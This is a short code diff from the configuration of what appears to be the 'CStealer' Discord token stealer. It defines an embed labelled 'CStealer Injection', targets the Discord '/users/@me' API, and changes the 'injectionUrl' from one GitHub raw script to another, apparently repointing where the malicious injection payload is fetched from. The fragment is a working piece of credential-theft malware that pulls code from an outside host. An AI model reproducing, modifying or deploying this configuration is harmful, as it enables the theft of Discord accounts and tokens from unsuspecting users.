@@ -15,7 +15,7 @@ const config = {
   embedName: 'CStealer Injection',
   embedIcon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png',
   embedColor: 2895667,
-  injectionUrl: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js',
+  injectionUrl: 'https://raw.githubusercontent.com/JuanitoKratos/trabajo/main/a.js',
   api: 'https://discord.com/api/v9/users/@me',
 };
 
